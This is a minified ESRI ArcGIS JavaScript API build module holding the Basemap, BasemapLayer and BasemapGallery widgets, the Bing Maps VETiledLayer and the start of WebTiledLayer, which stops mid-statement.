// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"esri/dijit/Basemap":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/has ../kernel ../request ./BasemapLayer".split(" "),function(e,h,g,q,c,t,u){e=e(null,{declaredClass:"esri.dijit.Basemap",id:null,title:"",thumbnailUrl:null,layers:null,itemId:null,basemapGallery:null,constructor:function(c,e){c=c||{};c.layers||c.itemId||console.error("esri.dijit.Basemap: unable to find the 'layers' property in parameters");this.id=c.id;this.itemId=c.itemId;this.layers=
c.layers;this.title=c.title||"";this.thumbnailUrl=c.thumbnailUrl;this.basemapGallery=e},getLayers:function(e){if(this.layers)return this.layers;if(this.itemId)return e=t({url:(e||c.dijit._arcgisUrl)+"/content/items/"+this.itemId+"/data",content:{f:"json"},callbackParamName:"callback",error:g.hitch(this,function(c,e){if(this.basemapGallery)this.basemapGallery.onError("esri.dijit.Basemap: could not access basemap item.");else console.error("esri.dijit.Basemap: could not access basemap item.")})}),e.addCallback(g.hitch(this,
function(c,e){if(c.baseMap)return this.layers=[],h.forEach(c.baseMap.baseMapLayers,function(c){this.layers.push(new u(c))},this),this.layers;if(this.basemapGallery)this.basemapGallery.onError("esri.dijit.Basemap: could not access basemap item.");else console.error("esri.dijit.Basemap: could not access basemap item.");return[]})),e}});q("extend-esri")&&g.setObject("dijit.Basemap",e,c);return e})},"esri/dijit/BasemapLayer":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/has","../kernel"],
function(e,h,g,q){e=e(null,{declaredClass:"esri.dijit.BasemapLayer",constructor:function(c){c=c||{};c.url||c.type||console.error("esri.dijit.BasemapLayer: unable to find the 'url' or 'type' property in parameters");this.url=c.url;this.type=c.type;this.isReference=!0===c.isReference?!0:!1;this.opacity=c.opacity;this.visibleLayers=c.visibleLayers;this.displayLevels=c.displayLevels;this.exclusionAreas=c.exclusionAreas;this.bandIds=c.bandIds;this.templateUrl=c.templateUrl;this.copyright=c.copyright;this.subDomains=
c.subDomains;this.fullExtent=c.fullExtent;this.initialExtent=c.initialExtent;this.tileInfo=c.tileInfo;this.tileServers=c.tileServers;this.styleUrl=c.styleUrl}});g("extend-esri")&&h.setObject("dijit.BasemapLayer",e,q);return e})},"esri/dijit/BasemapGallery":function(){define("require dojo/_base/declare dojo/_base/array dojo/_base/connect dojo/_base/lang dojo/_base/kernel dojo/_base/sniff dojo/has dojo/query dojo/Deferred dojo/DeferredList dojo/dom dojo/dom-construct dojo/dom-class dijit/_Widget dijit/_Templated ../kernel ../lang ../urlUtils ../request ../geometry/Extent ../SpatialReference ../virtualearth/VETiledLayer ../layers/OpenStreetMapLayer ../layers/ArcGISTiledMapServiceLayer ../layers/ArcGISDynamicMapServiceLayer ../layers/WebTiledLayer ../layers/VectorTileLayer ../layers/TileInfo ../layers/ArcGISImageServiceLayer ../layers/ImageServiceParameters ../layers/ImageParameters ./Basemap ./_EventedWidget dojo/text!./templates/BasemapGallery.html".split(" "),
function(e,h,g,q,c,t,u,z,A,w,x,n,r,y,l,v,a,b,f,k,p,E,B,K,C,F,L,G,M,H,I,J,N,O,P){h=h([O,l,v],{declaredClass:"esri.dijit.BasemapGallery",widgetsInTemplate:!0,templateString:P,loaded:!1,basemaps:[],bingMapsKey:null,flowContainer:null,_hasUI:!1,_supportsVTL:null,_selectedBasemap:null,_selectBasemapInProgress:!1,_eventMap:{load:!0,"selection-change":!0,add:["basemap"],remove:["basemap"],error:["message"]},constructor:function(d,b){d=d||{};d.map||console.error("esri.dijit.BasemapGallery: Unable to find the 'map' property in parameters");
this.map=d.map;this._hasUI=b?!0:!1;this.bingMapsKey=d.bingMapsKey&&0<d.bingMapsKey.length?d.bingMapsKey:null;this.showArcGISBasemaps=!1!==d.showArcGISBasemaps;this.basemaps=d.basemaps||[];this.basemapIds=d.basemapIds;this.referenceIds=d.referenceIds;this.basemapsGroup=d.basemapsGroup;this.arcgisUrl=a.dijit._arcgisUrl;d.portalUrl&&(this.arcgisUrl=d.portalUrl+"/sharing/rest");0>this.arcgisUrl.indexOf("://")?this.arcgisUrl=f.getProtocolForWebResource()+"//"+this.arcgisUrl:"https:"===window.location.protocol&&
(this.arcgisUrl=this.arcgisUrl.replace("http:","https:"));this.init()},init:function(){this.inherited(arguments);g.forEach(this.basemaps,function(d){d.id&&0!==d.id.length||(d.id=this._getUniqueId());g.forEach(d.layers,function(d){d.opacity=0<=d.opacity?d.opacity:1;d.visibility=!0},this)},this);this.basemapIds&&0<this.basemapIds.length&&g.forEach(this.basemapIds,function(d){this.map.getLayer(d)._basemapGalleryLayerType="basemap"},this);this.referenceIds&&0<this.referenceIds.length&&g.forEach(this.referenceIds,
function(d){d=this.map.getLayer(d);d._basemapGalleryLayerType="reference";d.attr("data-reference",!0)},this);this.basemapsGroup&&(this.basemapsGroup.owner&&this.basemapsGroup.title||this.basemapsGroup.id)?this._findCustomBasemapsGroup(c.hitch(this,"_handleArcGISBasemapsResponse")):this.showArcGISBasemaps?this._findArcGISBasemapsGroup(c.hitch(this,"_handleArcGISBasemapsResponse")):this._finishStartup();this._checkVTLSupport().then(c.hitch(this,function(d){this._supportsVTL=d}))},startup:function(){this.loaded?
this._refreshUI():q.connect(this,"onLoad",c.hitch(this,function(){this._refreshUI()}))},select:function(d){this._select(d)},getSelected:function(){return this._selectedBasemap},get:function(d){var a;for(a=0;a<this.basemaps.length;a++)if(this.basemaps[a].id===d)return this.basemaps[a];return null},add:function(d){return d&&!d.id?(d.id=this._getUniqueId(),this.basemaps.push(d),this._refreshUI(),this.onAdd(d),!0):d&&this._isUniqueId(d.id)?(this.basemaps.push(d),this._refreshUI(),this.onAdd(d),!0):!1},
remove:function(d){var a;for(a=0;a<this.basemaps.length;a++){var b=this.basemaps[a];if(b.id===d)return this._selectedBasemap&&this._selectedBasemap.id===b.id&&(this._selectedBasemap=null),this.basemaps.splice(a,1),this._refreshUI(),this.onRemove(b),b}return null},onLoad:function(){},onSelectionChange:function(){},onAdd:function(d){},onRemove:function(d){},onError:function(d){},_defaultBasemapGalleryGroupQuery:'title:"ArcGIS Online Basemaps" AND owner:esri',_basemapGalleryGroupQuery:null,_finishStartup:function(){this.loaded=
!0;this.onLoad();0===this.map.layerIds.length&&0<this.basemaps.length&&!this._selectBasemapInProgress&&this._select(this.basemaps[0].id)},_findCustomBasemapsGroup:function(d){this.basemapsGroup&&this.basemapsGroup.id?this._findArcGISBasemaps(this.basemapsGroup.id,d):(this._basemapGalleryGroupQuery='title:"'+this.basemapsGroup.title+'" AND owner:'+this.basemapsGroup.owner,this._findArcGISBasemapsGroup(d))},_findArcGISBasemapsGroup:function(d){if(this._basemapGalleryGroupQuery)this._findArcGISBasemapsGroupContent(d);
else{var a=this.arcgisUrl+"/portals/self",b={f:"json"};b.culture=t.locale;k({url:a,content:b,callbackParamName:"callback",load:c.hitch(this,function(a,b){a&&a.useVectorBasemaps&&a.vectorBasemapGalleryGroupQuery?this._checkVTLSupport().then(c.hitch(this,function(b){this._basemapGalleryGroupQuery=b?a.vectorBasemapGalleryGroupQuery:a&&a.basemapGalleryGroupQuery?a.basemapGalleryGroupQuery:this._defaultBasemapGalleryGroupQuery;this._findArcGISBasemapsGroupContent(d)})):(this._basemapGalleryGroupQuery=
a&&a.basemapGalleryGroupQuery?a.basemapGalleryGroupQuery:this._defaultBasemapGalleryGroupQuery,this._findArcGISBasemapsGroupContent(d))}),error:c.hitch(this,function(d,a){this._basemapGalleryGroupQuery=this._defaultBasemapGalleryGroupQuery})})}},_findArcGISBasemapsGroupContent:function(d){var a=c.hitch(this,"_findArcGISBasemaps"),b=this.arcgisUrl+"/community/groups",f={};f.q=this._basemapGalleryGroupQuery;f.f="json";k({url:b,content:f,callbackParamName:"callback",load:c.hitch(this,function(b,m){if(0<
b.results.length)a(b.results[0].id,d,b.results[0].sortField,b.results[0].sortOrder);else this.onError("esri.dijit.BasemapGallery: could not find group for basemaps.")}),error:c.hitch(this,function(d){this.onError("esri.dijit.BasemapGallery: could not find group for basemaps.")})})},_findArcGISBasemaps:function(d,a,b,f){var m=c.hitch(this,function(a,d,b,m){var f=this.arcgisUrl+"/search",D={};D.q="group:"+a+' AND type:"web map" NOT type:"web mapping application"';D.sortField=b;D.sortOrder="asc"===m?
"desc":"asc";D.num=50;D.f="json";k({url:f,content:D,callbackParamName:"callback",load:c.hitch(this,function(a,b){if(0<a.results.length)d(a.results);else this.onError("esri.dijit.BasemapGallery: could not find group for basemaps.")}),error:c.hitch(this,function(a,d){this.onError("esri.dijit.BasemapGallery: could not find group for basemaps.")})})});b&&f?m(d,a,b,f):k({url:this.arcgisUrl+"/community/groups/"+d,content:{f:"json"},callbackParamName:"callback",load:c.hitch(this,function(b,f){b.sortField?
m(d,a,b.sortField,b.sortOrder):m(d,a,"name","desc")}),error:c.hitch(this,function(b,f){m(d,a,"name","desc")})})},_handleArcGISBasemapsResponse:function(d){0<d.length&&(g.forEach(d,function(d,b){if(this.bingMapsKey||!this.bingMapsKey&&d.title&&-1===d.title.indexOf("Bing Maps")){b={};b.id=this._getUniqueId();b.title=d.title;b.thumbnailUrl="";if(d.thumbnail&&d.thumbnail.length&&(b.thumbnailUrl=this.arcgisUrl+"/content/items/"+d.id+"/info/"+d.thumbnail,a.id)){var m=a.id.findCredential(f.urlToObject(this.arcgisUrl).path);
m&&(b.thumbnailUrl+="?token\x3d"+m.token)}b.itemId=d.id;d=new N(b,this);this.basemaps.splice(0,0,d)}},this),this._finishStartup())},_refreshUI:function(){this._hasUI&&(r.empty(this.flowContainer),g.forEach(this.basemaps,function(d,a){d.id||(d.id="basemap_"+a);this.flowContainer.appendChild(this._buildNodeLayout(d))},this),r.create("br",{style:{clear:"both"}},this.flowContainer),this._markSelected(this._selectedBasemap))},_buildNodeLayout:function(d){var a=r.create("div",{id:"galleryNode_"+d.id,"class":"esriBasemapGalleryNode"}),
b=r.create("a",{href:"javascript:void(0);"},a);q.connect(b,"onclick",c.hitch(this,"_onNodeClick",d));var f=d.title||"";d.thumbnailUrl?r.create("img",{"class":"esriBasemapGalleryThumbnail",src:d.thumbnailUrl,title:f,alt:f},b):r.create("img",{"class":"esriBasemapGalleryThumbnail",src:e.toUrl("./images/transparent.gif"),title:f,alt:f},b);d=r.create("div",{"class":"esriBasemapGalleryLabelContainer"},a);r.create("span",{innerHTML:f,alt:f,title:f},d);return a},_onNodeClick:function(a,b){b.preventDefault();
this._markSelected(a);this.select(a.id)},_markSelected:function(a){a&&(g.forEach(t.query(".esriBasemapGallerySelectedNode",this.domNode),function(a){y.remove(a,"esriBasemapGallerySelectedNode")}),(a=n.byId("galleryNode_"+a.id))&&y.add(a,"esriBasemapGallerySelectedNode"))},_select:function(a){this._selectBasemapInProgress=!0;var d=this.get(a);d?(d.layers?this._getServiceInfos(d):(a=d.getLayers(this.arcgisUrl),c.isArray(a)?this._getServiceInfos(d):a.addCallback(c.hitch(this,function(a){this._getServiceInfos(d)}))),
this._markSelected(d)):this._selectBasemapInProgress=!1},_getServiceInfos:function(a){"https:"===location.protocol&&g.forEach(a.layers,function(a){if(this._isAgolService(a.url)||this._isHostedService(a.url))a.url=a.url.replace("http:","https:")},this);this._selectedBasemap=a;var d=[];g.forEach(a.layers,function(a){a.url&&0<a.url.length&&!a.isReference&&!a.type&&(a.deferredsPos=d.length,d.push(this._getServiceInfo(a.url)))},this);0<d.length?(new x(d)).addCallback(c.hitch(this,function(d){var b=null;
g.forEach(a.layers,function(a){if(0===a.deferredsPos||a.deferredsPos){a.serviceInfoResponse=d[a.deferredsPos][1];var f=a.serviceInfoResponse.fullExtent;f||(f=a.serviceInfoResponse.extent);b=b?b.union(new p(f)):new p(f)}},this);this.map.extent&&5>this._getIntersectionPercent(b,this.map.extent)&&this.map.setExtent(b,!0);this._switchBasemapLayers(a);this._updateReferenceLayer(a)})):(this._switchBasemapLayers(a),this._updateReferenceLayer(a))},_checkVTLSupport:function(){var a=new w;u("ie")?a.resolve(!1):
a.resolve(G.supported());return a},_switchBasemapLayers:function(a){var d=a.layers,b=!1,f,k,v;g.forEach(d,function(a){"VectorTileLayer"===a.type&&(b=!0)});if(b&&!0!==this._supportsVTL)this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because layer type is not supported by your current browser version.");else if(0<this.map.layerIds.length&&0===this.map.getNumLevels()&&("OpenStreetMap"===d[0].type||d[0].type&&-1<d[0].type.indexOf("BingMaps")||"WebTiledLayer"===d[0].type||"VectorTileLayer"===
d[0].type))this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap is a tiled service and cannot be loaded as a dynamic layer.");else{g.forEach(d,function(a){if(!a.isReference&&a.type&&-1<a.type.indexOf("BingMaps")&&!this.bingMapsKey)this.onError("esri.dijit.BasemapGallery: Invalid Bing Maps key.")},this);var e=0;g.forEach(d,function(a,b){if(!a.isReference){var m;if("OpenStreetMap"===a.type){if(0<this.map.layerIds.length&&0===this.map.getNumLevels()){this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap is a tiled service and cannot be loaded as a dynamic layer.");
return}m=new K({id:"layer_osm",opacity:a.opacity})}else if(a.type&&-1<a.type.indexOf("BingMaps")){if(0<this.map.layerIds.length&&0===this.map.getNumLevels()){this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap is a tiled service and cannot be loaded as a dynamic layer.");return}m=B.MAP_STYLE_AERIAL_WITH_LABELS;"BingMapsAerial"===a.type?m=B.MAP_STYLE_AERIAL:"BingMapsRoad"===a.type&&(m=B.MAP_STYLE_ROAD);m=new B({id:"layer_bing",bingMapsKey:this.bingMapsKey,mapStyle:m,
opacity:a.opacity})}else if("WebTiledLayer"===a.type){if(0<this.map.layerIds.length&&0===this.map.getNumLevels()){this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap is a tiled service and cannot be loaded as a dynamic layer.");return}m=a.initialExtent||a.fullExtent;m=new L(a.templateUrl||a.url,{visible:a.visibility,opacity:a.opacity,copyright:a.copyright,fullExtent:a.fullExtent&&new p(a.fullExtent),initialExtent:m&&new p(m),subDomains:a.subDomains,tileInfo:a.tileInfo?
new M(a.tileInfo):null,tileServers:a.tileServers})}else if("VectorTileLayer"===a.type){m=new G(a.styleUrl,{visible:a.visibility,opacity:a.opacity});0===b&&1<d.length&&this._removeBasemapLayers();var g=this;q.connect(m,"onLoad",c.hitch(this,function(a,b,f){var m;if(g._sameSpatialReference(f.spatialReference,g.map.spatialReference))if(0<g.map.getNumLevels())if(m=g._sameTilingScheme(f.tileInfo,g.map.__tileInfo))0===b&&1===d.length&&g._removeBasemapLayers(),f._basemapGalleryLayerType="basemap",g.map.addLayer(f,
a);else g.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap has a different tiling scheme.");else g.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap is a tiled service and cannot be loaded as a dynamic layer.");else g.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap has a different spatial reference.")},e,b))}else if(a.serviceInfoResponse&&a.serviceInfoResponse.mapName){f=new E(a.serviceInfoResponse.spatialReference);
k=this._sameSpatialReference(f,this.map.spatialReference);if(this.map.spatialReference&&!k){this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap has a different spatial reference.");return}if(!0===a.serviceInfoResponse.singleFusedMapCache&&0<this.map.getNumLevels()){if(v=this._sameTilingScheme(a.serviceInfoResponse.tileInfo,this.map.__tileInfo),!v){this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap has a different tiling scheme.");
return}}else if(!0===a.serviceInfoResponse.singleFusedMapCache&&-1<a.serviceInfoResponse.capabilities.toLowerCase().indexOf("tilesonly")&&0===this.map.getNumLevels()){this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap is a tiled service and cannot be loaded as a dynamic layer.");return}m=(0===this.map.layerIds.length||0<this.map.getNumLevels())&&!0===a.serviceInfoResponse.singleFusedMapCache?this._loadAsCached(a):this._loadAsDynamic(a)}else if(a.serviceInfoResponse&&
a.serviceInfoResponse.pixelSizeX){f=new E(a.serviceInfoResponse.spatialReference);k=this._sameSpatialReference(f,this.map.spatialReference);if(!k){this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap has a different spatial reference.");return}if(!0===a.serviceInfoResponse.singleFusedMapCache&&0<this.map.getNumLevels()&&(v=this._sameTilingScheme(a.serviceInfoResponse.tileInfo,this.map.__tileInfo),!v)){this.onError("esri.dijit.BasemapGallery: Unable to switch basemap because new basemap has a different tiling scheme.");
return}a.serviceInfoResponse.singleFusedMapCache?m=new C(a.url,{resourceInfo:a.serviceInfoResponse,opacity:a.opacity,visible:a.visibility}):a.serviceInfoResponse.pixelSizeX?(m=new I,m.bandIds=a.bandIds,!a.bandIds&&a.serviceInfoResponse.bandCount&&3<parseInt(a.serviceInfoResponse.bandCount,10)&&(m.bandIds=[0,1,2]),m=new H(a.url,{resourceInfo:a.serviceInfoResponse,opacity:a.opacity,visible:a.visibility,imageServiceParameters:m})):(m=new J,m.format="png24",a.serviceInfoResponse.supportedImageFormatTypes&&
-1<a.serviceInfoResponse.supportedImageFormatTypes.indexOf("PNG32")&&(m.format="png32"),m=new F(a.url,{resourceInfo:a.serviceInfoResponse,opacity:a.opacity,visible:a.visibility,imageParameters:m}))}"VectorTileLayer"===a.type?e++:m&&(0===b&&this._removeBasemapLayers(),m._basemapGalleryLayerType="basemap",this.map.addLayer(m,e),e++)}},this);this._selectBasemapInProgress=!1;this.onSelectionChange()}},_removeBasemapLayers:function(){var a=this.map.layerIds,b=[];g.forEach(a,function(a){a=this.map.getLayer(a);
"basemap"===a._basemapGalleryLayerType&&b.push(a)},this);0===b.length&&0<a.length&&b.push(this.map.getLayer(a[0]));0<b.length&&g.forEach(b,function(a){this.map.removeLayer(a)},this)},_updateReferenceLayer:function(a){var b;this._removeReferenceLayer();for(b=0;b<a.layers.length;b++)!0===a.layers[b].isReference&&this._addReferenceLayer(a.layers[b])},_removeReferenceLayer:function(){var a;for(a=this.map.layerIds.length-1;0<=a;a--){var b=this.map.getLayer(this.map.layerIds[a]);"reference"===b._basemapGalleryLayerType&&
this.map.removeLayer(b)}},_addReferenceLayer:function(a){"VectorTileLayer"===a.type?this._handleReferenceServiceInfoResponse(a):this._getServiceInfo(a.url,c.hitch(this,"_handleReferenceServiceInfoResponse",a))},_handleReferenceServiceInfoResponse:function(a,b,f){var d;a.serviceInfoResponse=b;"VectorTileLayer"===a.type?d=new G(a.styleUrl,{visible:a.visibility,opacity:a.opacity}):b&&b.mapName?d=!0===b.singleFusedMapCache?this._loadAsCached(a):this._loadAsDynamic(a):b&&b.pixelSizeX&&(a.serviceInfoResponse.singleFusedMapCache?
d=new C(a.url,{resourceInfo:a.serviceInfoResponse,opacity:a.opacity,visible:a.visibility}):a.serviceInfoResponse.pixelSizeX?(f=new I,f.bandIds=a.bandIds,!a.bandIds&&b.bandCount&&3<parseInt(b.bandCount,10)&&(f.bandIds=[0,1,2]),d=new H(a.url,{resourceInfo:b,opacity:a.opacity,visible:a.visibility,imageServiceParameters:f})):(b=new J,b.format="png24",a.serviceInfoResponse.supportedImageFormatTypes&&-1<a.serviceInfoResponse.supportedImageFormatTypes.indexOf("PNG32")&&(b.format="png32"),b.transparent=!0,
d=new F(a.url,{resourceInfo:a.serviceInfoResponse,opacity:a.opacity,visible:a.visibility,imageParameters:b})));d&&(d._basemapGalleryLayerType="reference",d.attr("data-reference",!0),this.map.addLayer(d))},_getServiceInfo:function(a,b){return k({url:a,content:{f:"json"},callbackParamName:"callback",load:function(a,d){b&&b(a,d)},error:c.hitch(this,function(a,b){this.onError("esri.dijit.BasemapGallery: service not accessible.")})})},_loadAsCached:function(a){var b=[];a.displayLevels||(b=g.map(a.serviceInfoResponse.tileInfo.lods,
function(a){return a.level}));var d=null;a.exclusionAreas&&a.exclusionAreas.length&&(d=[],g.forEach(a.exclusionAreas,function(a){d.push({minZoom:a.minZoom,maxZoom:a.maxZoom,minScale:a.minScale,maxScale:a.maxScale,geometry:new p(a.geometry)})}));return new C(a.url,{resourceInfo:a.serviceInfoResponse,opacity:a.opacity,visible:a.visibility,exclusionAreas:d,displayLevels:a.displayLevels||b})},_loadAsDynamic:function(a){var b=new F(a.url,{resourceInfo:a.serviceInfoResponse,opacity:a.opacity,visible:a.visibility});
a.visibleLayers&&b.setVisibleLayers(a.visibleLayers);return b},_getIntersectionPercent:function(a,b){return(a=b.intersects(a))?(a=a.getWidth()*a.getHeight(),b=b.getWidth()*b.getHeight(),a/b*100):0},_getIds:function(){var a=[];g.forEach(this.basemaps,function(b){a.push(b.id)},this);return a},_getUniqueId:function(){for(var a=","+this._getIds().toString()+",",b=0;;)if(-1<a.indexOf(",basemap_"+b+","))b++;else return"basemap_"+b},_isUniqueId:function(a){return-1===(","+this._getIds().toString()+",").indexOf(","+
a+",")?!0:!1},_isAgolService:function(a){return a?-1!==a.indexOf("/services.arcgisonline.com/")||-1!==a.indexOf("/server.arcgisonline.com/"):!1},_isHostedService:function(a){return a?-1!==a.indexOf(".arcgis.com/"):!1},_sameSpatialReference:function(a,f){return a&&f&&a.wkt==f.wkt&&(a.wkid===f.wkid||b.isDefined(a.latestWkid)&&a.latestWkid===f.wkid||b.isDefined(f.latestWkid)&&a.wkid===f.latestWkid||b.isDefined(a.latestWkid)&&a.latestWkid===f.latestWkid)||a&&f&&a.isWebMercator()&&f.isWebMercator()?!0:
!1},_sameTilingScheme:function(a,b){var f=this.map,f=f.width>f.height?f.width:f.height,d=!1,k=!1,c,v;for(c=0;c<a.lods.length;c++){var p=a.lods[c].scale;a.dpi!==b.dpi&&(p=a.lods[c].scale/a.dpi);for(v=0;v<b.lods.length;v++){var e=b.lods[v].scale;a.dpi!==b.dpi&&(e=b.lods[v].scale/b.dpi);if(Math.abs(e-p)/e<1/f)if(d){k=!0;break}else d=!0;if(e<p)break}if(k)break}return k||d&&(1===a.lods.length||1===b.lods.length)?!0:!1}});z("extend-esri")&&c.setObject("dijit.BasemapGallery",h,a);return h})},"esri/virtualearth/VETiledLayer":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/json dojo/_base/array dojo/_base/config dojo/has dojo/string dojo/_base/Deferred ../kernel ../urlUtils ../SpatialReference ../layers/TileInfo ../layers/TiledMapServiceLayer ../geometry/Extent ../request".split(" "),
function(e,h,g,q,c,t,u,z,A,w,x,n,r,y,l){e=e(r,{declaredClass:"esri.virtualearth.VETiledLayer",constructor:function(c){try{if(c=h.mixin({bingMapsKey:null,culture:"en-US"},c||{}),this.url=w.getProtocolForWebResource()+"//dev.virtualearth.net/REST/v1",this._url=w.urlToObject(this.url),this.spatialReference=new x({wkid:102100}),this.tileInfo=new n({rows:256,cols:256,dpi:96,origin:{x:-2.0037508342787E7,y:2.0037508342787E7},spatialReference:{wkid:102100},lods:[{level:1,resolution:78271.5169639999,scale:2.95828763795777E8},
{level:2,resolution:39135.7584820001,scale:1.47914381897889E8},{level:3,resolution:19567.8792409999,scale:7.3957190948944E7},{level:4,resolution:9783.93962049996,scale:3.6978595474472E7},{level:5,resolution:4891.96981024998,scale:1.8489297737236E7},{level:6,resolution:2445.98490512499,scale:9244648.868618},{level:7,resolution:1222.99245256249,scale:4622324.434309},{level:8,resolution:611.49622628138,scale:2311162.217155},{level:9,resolution:305.748113140558,scale:1155581.108577},{level:10,resolution:152.874056570411,
scale:577790.554289},{level:11,resolution:76.4370282850732,scale:288895.277144},{level:12,resolution:38.2185141425366,scale:144447.638572},{level:13,resolution:19.1092570712683,scale:72223.819286},{level:14,resolution:9.55462853563415,scale:36111.909643},{level:15,resolution:4.77731426794937,scale:18055.954822},{level:16,resolution:2.38865713397468,scale:9027.977411},{level:17,resolution:1.19432856685505,scale:4513.988705},{level:18,resolution:.597164283559817,scale:2256.994353},{level:19,resolution:.298582141647617,
scale:1128.497176},{level:20,resolution:.1492910708238085,scale:564.248588}]}),this.initialExtent=this.fullExtent=new y(-2.0037508342787E7,-2.003750834278E7,2.003750834278E7,2.0037508342787E7,new x({wkid:102100})),h.mixin(this,c),this.hasAttributionData=this.showAttribution,this._initLayer=h.hitch(this,this._initLayer),this._errorHandler=h.hitch(this,this._errorHandler),this._getTileInfo=h.hitch(this,this._getTileInfo),this.bingMapsKey)this._getTileInfo();else throw Error("BingMapsKey must be provided.");
}catch(a){throw this.onError(a),a;}},_unsetMap:function(c,a){this.inherited("_unsetMap",arguments)},_getTileInfo:function(){if(this.mapStyle){var c=this._url.path+"/Imagery/Metadata/"+this.mapStyle,a=window.location.protocol;if(this.bingMapsKey){var b=this.resourceInfo;!this.loaded&&b?this._initLayer(b):l({url:c,content:h.mixin({},{uriScheme:"https:"===a?"https":"http",key:this.bingMapsKey,ss:!0,c:this.culture,include:this.hasAttributionData?"imageryProviders":null}),callbackParamName:"jsonp",load:this._initLayer,
error:this._errorHandler})}}},_initLayer:function(c,a){if(200!==c.statusCode)a=Error(),a.code=c.statusCode,a.message=c.statusDescription,a.details=c.errorDetails,a.authenticationResultCode=c.authenticationResultCode,this.onError(a);else try{this.resourceInfo=g.toJson(c);var b=c.resourceSets[0].resources[0],f=b.imageUrl.replace("{","${");this.tileServers=q.map(b.imageUrlSubdomains,function(a){var b=w.getProtocolForWebResource();return u.substitute(f,{subdomain:a}).replace("http:",b)});this._tsLength=
this.tileServers.length;if(this.loaded)this.refresh(),this.onMapStyleChange();else{this.copyright=this.copyright||"\x26copy; 2017 Microsoft Corporation and its data suppliers";this.loaded=!0;this.onLoad(this);var k=this.loadCallback;k&&(delete this.loadCallback,k(this))}}catch(p){this.onError(p)}},getAttributionData:function(){var e=new z,a=g.fromJson(this.resourceInfo),b;this.hasAttributionData&&a&&(b=h.getObject("resourceSets.0.resources.0.imageryProviders",!1,a));b?e.callback({contributors:b}):
(a=Error("Layer does not have attribution data"),a.log=c.isDebug,e.errback(a));return e},getTileUrl:function(c,a,b){return u.substitute(this.tileServers[a%this._tsLength].replace(/\{/g,"${"),{quadkey:this._getQuadKey(c,a,b),culture:this.culture,token:this.bingMapsKey})},_getQuadKey:function(c,a,b){var f="",k,e;for(e=c;0<e;e--)c="0",k=1<<e-1,0!=(b&k)&&c++,0!=(a&k)&&(c++,c++),f+=c;return f},setMapStyle:function(c){this.mapStyle=c;this._getTileInfo()},setCulture:function(c){this.culture=c;this._getTileInfo()},
setBingMapsKey:function(c){this.bingMapsKey=c},onMapStyleChange:function(){}});h.mixin(e,{MAP_STYLE_AERIAL:"aerial",MAP_STYLE_AERIAL_WITH_LABELS:"aerialWithLabelsOnDemand",MAP_STYLE_ROAD:"roadOnDemand"});t("extend-esri")&&h.setObject("virtualearth.VETiledLayer",e,A);return e})},"esri/layers/WebTiledLayer":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/url dojo/sniff dojo/string ../config ../kernel ../request ../urlUtils ../SpatialReference ../geometry/Extent ./TiledMapServiceLayer ./TileInfo".split(" "),
function(e,h,g,q,c,t,u,z,A,w,x,n,r,y){function l(c,a){var b=[],f;if(c&&a&&(a.customLayerParameters||a.customParameters)){f=h.clone(a.customParameters||{});h.mixin(f,a.customLayerParameters||{});c=w.urlToObject(c);for(var k in c.query)f.hasOwnProperty(k)||b.push(k+"\x3d"+c.query[k]);c=c.path+(b.length?"?"+b.join("\x26"):"")}return c}e=e(r,{declaredClass:"esri.layers.WebTiledLayer",constructor:function(e,a){a||(a={});this.urlTemplate=e=l(e,a.wmtsInfo);var b=new n(-2.0037508342787E7,-2.003750834278E7,
2.003750834278E7,2.0037508342787E7,new x({wkid:102100})),f=new n(-2.0037508342787E7,-2.003750834278E7,2.003750834278E7,2.0037508342787E7,new x({wkid:102100}));this.initialExtent=a.initialExtent||b;this.fullExtent=a.fullExtent||f;this.tileInfo=a.tileInfo?a.tileInfo:new y({dpi:96,rows:256,cols:256,origin:{x:-2.0037508342787E7,y:2.0037508342787E7},spatialReference:{wkid:102100},lods:[{level:0,resolution:156543.033928,scale:5.91657527591555E8},{level:1,resolution:78271.5169639999,scale:2.95828763795777E8},
{level:2,resolution:39135.7584820001,scale:1.47914381897889E8},{level:3,resolution:19567.8792409999,scale:7.3957190948944E7},{level:4,resolution:9783.93962049996,scale:3.6978595474472E7},{level:5,resolution:4891.96981024998,scale:1.8489297737236E7},{level:6,resolution:2445.98490512499,scale:9244648.868618},{level:7,resolution:1222.99245256249,scale:4622324.434309},{level:8,resolution:611.49622628138,scale:2311162.217155},{level:9,resolution:305.748113140558,scale:1155581.108577},{level:10,resolution:152.874056570411,
scale:577790.554289},{level:11,resolution:76.4370282850732,scale:288895.277144},{level:12,resolution:38.2185141425366,scale:144447.638572},{level:13,resolution:19.1092570712683,scale:72223.819286},{level:14,resolution:9.55462853563415,scale:36111.909643},{level:15,resolution:4.77731426794937,scale:18055.954822},{level:16,resolution:2.38865713397468,scale:9027.977411},{level:17,resolution:1.19432856685505,scale:4513.988705},{level:18,resolution:.597164283559817,scale:2256.994353},{level:19,resolution:.298582141647617,
scale:1128.497176},{level:20,resolution:.14929107082380833,scale:564.248588},{level:21,resolution:.07464553541190416,scale:282.124294},{level:22,resolution:.03732276770595208,scale:141.062147},{level:23,resolution:.01866138385297604,scale:70.5310735}]});this.spatialReference=new x(this.tileInfo.spatialReference.toJson());this.copyright=a.copyright||"";var k=new q(e),b=k.scheme+"://"+k.authority+"/";this.urlPath=e.substring(b.length);this.tileServers=a.tileServers||[];-1===k.authority.indexOf("{subDomain}")&&
